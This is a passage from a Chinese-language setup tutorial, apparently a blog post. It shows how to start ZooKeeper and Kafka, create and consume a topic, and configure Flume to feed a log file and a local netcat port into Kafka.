default\nUsing config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg\nStarting zookeeper ... already running as process 5452.\n```\n```bash\nkafka-server-start.sh ./config/server.properties\n```\n1.3 创建topic\n\ntopic:指定topic name\n\npartitions:指定分区数，这个参数需要根据broker数和数据量决定，正常情况下，每个broker上两个partition最好\n\nreplication-factor:副本数，建议设置为2\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-test2 --replication-factor 1 --partitions 1\n```\n1.4 启动kafka去消费topic\n```bash\nkafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-test2\n--from-beginning 可选参数,代表从头消费\n```\n1.5 启动flume\n```bash\n./bin/flume-ng agent -n a1 -c ./conf/ -f ./conf/flume-kafka-port.conf -Dflume.root.logger=INFO,console\n```\n1.6 向日志文件/tmp/log.txt写入一些数据\n```bash\necho '123' >> /tmp/log.txt\n```\n就可以在消费者窗口看到输出\n\n\n\n#### 2.flume采集端口数据到kafka自定义topic\n\n2.1 新建配置文件 flume-kafka-port.conf\n```bash\n#指定agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n \n# 描述和配置source组件：r1\na1.sources.r1.type = netcat\na1.sources.r1.bind = localhost\na1.sources.r1.port = 55555 \n# 描述和配置sink组件：k1\na1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink\na1.sinks.k1.kafka.topic = topic-test2\na1.sinks.k1.kafka.bootstrap.servers = localhost:9092\na1.sinks.k1.kafka.flumeBatchSize = 20\na1.sinks.k1.kafka.producer.acks = 1\na1.sinks.k1.kafka.producer.linger.ms = 1\na1.sinks.ki.kafka.producer.compression.type = snappy\n \n# 描述和配置channel组件，此处使用是内存缓存的方式\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n \n# 描述和配置source  channel   sink之间的连接关系\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n\n2.2所有操作与上文一致\n略\n\n2.3 向端口发送数据\n```bash\nroot@ubuntu:~# nc localhost 55555\nOK\nls\nOK\nls\nOK\nls\nOK\nls\nOK\nls\n```\n\n在消费者端口可以看到\n```bash\nls\nls\nls\nls\nls\n```","tags":["hadoop","kafka","flume"],"categories":["环境搭建"]}]